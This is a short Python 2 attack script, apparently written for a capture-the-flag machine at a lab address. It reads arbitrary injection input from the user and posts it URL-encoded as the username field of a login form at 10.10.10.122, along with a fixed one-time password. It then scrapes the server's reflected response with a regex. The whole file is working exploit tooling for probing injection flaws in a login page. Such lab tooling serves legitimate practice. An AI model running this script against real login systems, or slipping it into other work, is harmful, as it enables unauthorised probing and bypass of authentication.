#!/usr/bin/python

import re
import requests
import urllib

def main(): 
  cmd = raw_input("input$ ")
  data = {
   "inputUsername": urllib.quote(cmd),
   "inputOTP": "000000",
  }

  print("Payload: {}".format(data['inputUsername']))
  
  a = requests.post("http://10.10.10.122/login.php", data=data)
  b = re.search(r'<form action="/login.php" method="post" >\s+<div class="form-group row">\s+<div class="col-sm-10">\s+(.*)</div>', a.text)
  print(b.group(1))    

if __name__== "__main__":
 main()

